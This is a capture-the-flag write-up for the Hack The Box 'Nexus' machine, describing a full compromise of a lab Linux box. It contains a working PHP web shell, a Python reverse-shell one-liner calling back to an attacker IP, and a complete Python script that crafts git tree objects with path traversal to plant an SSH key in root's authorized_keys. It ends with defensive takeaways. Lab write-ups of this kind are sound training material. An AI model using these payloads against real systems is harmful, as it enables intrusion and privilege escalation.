# Hack The Box — Nexus (Easy Linux)

**Platform:** Hack The Box — Season 11 (Live)
**Difficulty:** Easy
**OS:** Linux
**Flags:** User ✅ | Root ✅
**Completion:** https://labs.hackthebox.com/achievement/machine/533012/948

---



---

## Reconnaissance

### Port Scan

A versioned Nmap scan through Metasploit's `db_nmap` was run against the target to populate the workspace database:

```bash
msf6 > workspace -a nexus
msf6 > db_nmap -sV -sC 10.129.38.143
```

Two open ports were identified:

```
10.129.38.143  22    tcp    ssh    open   OpenSSH
10.129.38.143  80    tcp    http   open   Apache httpd
```

---

## Enumeration

### Subdomain Discovery

With only port 80 exposed, subdomain enumeration was performed against the `nexus.htb` domain. Two virtual hosts were discovered:

```
git.nexus.htb      — Gitea self-hosted git service
billing.nexus.htb  — Krayin CRM application
```

Both were added to `/etc/hosts` to enable access:

```bash
echo "10.129.38.143 git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
```

### Gitea Enumeration — Credential Discovery

Browsing to `http://git.nexus.htb` revealed a publicly accessible Gitea instance. Enumerating the hosted repositories exposed a `.env` file containing plaintext application credentials:

![alt text](image.png)
![alt text](image-1.png)

```
Email    : j.matthew@nexus.htb
Password : N27xh!!2ucY04
```

### Krayin CRM — Authenticated Access

The credentials recovered from Gitea were used to log in to the Krayin CRM at:

```
http://billing.nexus.htb/admin/login
```

Login was successful. After exploring the application, the CRM was found to include a **TinyMCE rich-text editor** reachable via the mail compose interface (`Mail → Inbox → Compose`). The editor exposes a file upload endpoint:

```
http://billing.nexus.htb/admin/tinymce/upload
```

---

## Exploitation
Krayin CRM 2.2.0 does have a documented authenticated arbitrary file upload issue that can lead to RCE. The advisory for CVE-2026-38526 says it affects the /admin/tinymce/upload endpoint in Webkul Krayin CRM v2.2.x and allows authenticated attackers to upload arbitrary files.
![alt text](image-2.png)

### File Upload — PHP Web Shell via Double Extension Bypass
####  Let's Exploit this vulnebility by a attacker way 

The TinyMCE upload endpoint accepts image files. To bypass the extension filter, a PHP web shell was saved with a double extension (`shell.php.png`):

```php
<?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
```
![alt text](image-3.png)

The file was attached to a composed mail message and the upload request was intercepted in Burp Suite. The filename was modified in the intercepted request to ensure the `.php` extension was preserved by the server. The server's response returned the full path to the uploaded file:

![alt text](image-4.png)
![alt text](image-5.png)

```
/storage/tinymce/f4b29f7976bd26311d2cf0d96639066c.php
```

### Verifying Command Execution

The web shell was confirmed by issuing a `whoami` command via the URL:

```
http://billing.nexus.htb/storage/tinymce/f4b29f7976bd26311d2cf0d96639066c.php?cmd=whoami
```
![alt text](image-6.png)

The response confirmed execution as `www-data`.

### Obtaining a Reverse Shell

A Netcat listener was started on the attacker machine:

```bash
nc -lvnp 4444
```

A Python3 reverse shell payload was then sent through the web shell via `curl`:

```bash
curl "http://billing.nexus.htb/storage/tinymce/f4b29f7976bd26311d2cf0d96639066c.php?cmd=python3%20-c%20'import%20os,pty,socket;s=socket.socket();s.connect((\"10.10.17.64\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
```

A shell was received as `www-data`.

---
![alt text](image-8.png)

## Post-Exploitation — Credential Harvesting

### User Enumeration

With a shell on the box, `/etc/passwd` was reviewed to identify local users with login shells. Two accounts stood out:

```
jones:x:1000:1000:,,,:/home/jones:/bin/bash
git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
```

### .env File — Krayin CRM Database Credentials

The Krayin CRM application directory was enumerated:

```bash
cat /var/www/krayin/.env
```

The `.env` file contained database credentials:

```
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
```
![alt text](image-9.png)


### SSH Access as jones

The database password was tested against the `jones` local account over SSH — a classic credential reuse case:

```bash
ssh jones@10.129.38.143
# Password: y27xb3ha!!74GbR
```

Login was successful.

---

## User Flag

```bash
cat /home/jones/user.txt
```

```
dc6b25939d02035280238265ffd60f0e
```
![alt text](image-10.png)
---

## Privilege Escalation

### Discovering the Root-Owned Timer

### LinPEAS output, I can see:


```
# Timer running every ~1 minute:
gitea-template-sync.timer → gitea-template-sync.service

# The sync script at /etc/gitea/template-sync.py
# Uses os.path.join() WITHOUT sanitizing directory traversal (../)
```

System cron jobs and timers were enumerated. A root-owned scheduled task was identified that periodically executes a Gitea template repository sync process. The sync operation clones template repositories marked in Gitea using `git clone` — running as root.


### Accessing Gitea

Gitea was running internally on port 3000. An SSH tunnel was established to reach it from the attacker machine:

```bash
ssh -L 3000:127.0.0.1:3000 jones@10.129.38.143
```

Gitea was then accessible at `http://git.nexus.htb:3000`. Login was successful using the same `jones` credentials:

```
Username : jones
Password : y27xb3ha!!74GbR
```

### Generating an SSH Key Pair

An SSH key pair was generated on the attacker machine to be injected into root's `authorized_keys`:

```bash
ssh-keygen -t ed25519 -f /tmp/.k -N ''
```

This produced `/tmp/.k` (private key) and `/tmp/.k.pub` (public key).

![alt text](image-11.png)

### Creating a Malicious Template Repository

A new repository was created in Gitea (`rce`), with the **"Make repository a template"** option enabled. It was cloned locally:

![alt text](image-12.png)

```bash
cd /tmp
git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/rce.git
cd rce
```

A `build.py` script was written to craft a malicious git tree object containing a **path traversal sequence** (`../../../../../root/.ssh/authorized_keys`). When the root-owned sync process clones this template repository, the traversal in the tree object causes git to write the public key file outside the expected clone destination — directly into `/root/.ssh/authorized_keys`:

```python
#!/usr/bin/env python3
import hashlib, zlib, os, subprocess, sys, time

def write_obj(data, t):
    h = ("%s %d" % (t, len(data))).encode() + b"\x00"
    s = h + data
    sha = hashlib.sha1(s).hexdigest()
    d = os.path.join(".git", "objects", sha[:2])
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, sha[2:])
    if not os.path.exists(p):
        open(p, "wb").write(zlib.compress(s))
    return sha

def entry(mode, name, sha):
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)

r = subprocess.run(["cat", "/tmp/.k.pub"], capture_output=True, text=True)
key = r.stdout.strip() + "\n"
blob = write_obj(key.encode(), "blob")
readme = write_obj(b"# Template\n", "blob")

# Build tree with path traversal targeting /root/.ssh/authorized_keys
ssh_t = write_obj(entry("100644", "authorized_keys", blob), "tree")
cur   = write_obj(entry("40000", ".ssh", ssh_t), "tree")
fir   = write_obj(entry("40000", "root", cur), "tree")

for i in range(4):
    fir = write_obj(entry("40000", "..", fir), "tree")

root = write_obj(
    entry("100644", "README.md", readme) + entry("40000", "..", fir), "tree"
)

ts = int(time.time())
c = "tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n" % (root, ts, ts)
sha = write_obj(c.encode(), "commit")

os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
open(os.path.join(".git", "refs", "heads", "main"), "w").write(sha + "\n")
print("Done: " + sha)
```

The script was executed and the malicious commit was pushed to the template repository:

```bash
python3 build.py
git push -u origin main --force
```
![alt text](image-13.png)

### Waiting for the Timer

The root-owned sync timer fires automatically within approximately one minute. The sync log was monitored to confirm execution:

```bash
cat /var/log/template-sync.log
```
![alt text](image-14.png)

The log confirmed the traversal path was processed and the file was written.

### SSH as Root

With the public key now in `/root/.ssh/authorized_keys`, SSH access as root was obtained using the private key:

```bash
ssh -i /tmp/.k root@10.129.38.143
```

---

## Root Flag

```bash
cat /root/root.txt
```

```
33414b28f2d67cf5987cce3629307ead
```
![alt text](image-15.png)

---

## Summary

| Phase | Technique | Detail |
|---|---|---|
| Reconnaissance | TCP Port Scan via `db_nmap` | SSH (22), HTTP (80) |
| Enumeration | Subdomain Discovery | `git.nexus.htb` (Gitea) and `billing.nexus.htb` (Krayin CRM) |
| Credential Discovery | Public Gitea `.env` File | CRM credentials exposed in repository |
| Initial Access | Authenticated File Upload + Double Extension Bypass | PHP web shell uploaded via TinyMCE editor |
| Shell | Reverse Shell via PHP web shell | Python3 socket reverse shell as `www-data` |
| Lateral Movement | `.env` Credential Harvesting + Credential Reuse | DB password reused for `jones` SSH login |
| Privilege Escalation | Git Tree Path Traversal via Gitea Template Sync | Root-owned timer clones attacker template → writes SSH key to `/root/.ssh/authorized_keys` |

---

## Key Takeaways

- **File upload validation must be enforced server-side on the final stored filename**, not just the submitted filename. Double extensions like `.php.png` are a well-known bypass when only the last extension is checked client-side or inconsistently server-side.
- **`.env` files should never be world-readable** on a production system. Application secrets — database passwords, API keys — stored in `.env` are a common lateral movement source when a low-privileged shell is obtained.
- **Credential reuse across services** continues to be a reliable pivot point. Separate credentials per service should be enforced, and secrets used in application config should never match OS-level user passwords.
- **Root-owned processes that execute `git clone` on attacker-controllable repositories** are a dangerous pattern. Git's internal object model allows tree entries to contain path traversal sequences (`..`) that a naive `git clone` will follow, writing files outside the intended destination. Cloning untrusted repositories as root is effectively arbitrary file write as root.
- **Template sync services and CI/CD runners executing as privileged users** represent a consistently exploitable privilege escalation primitive — always audit what user automated git operations run as.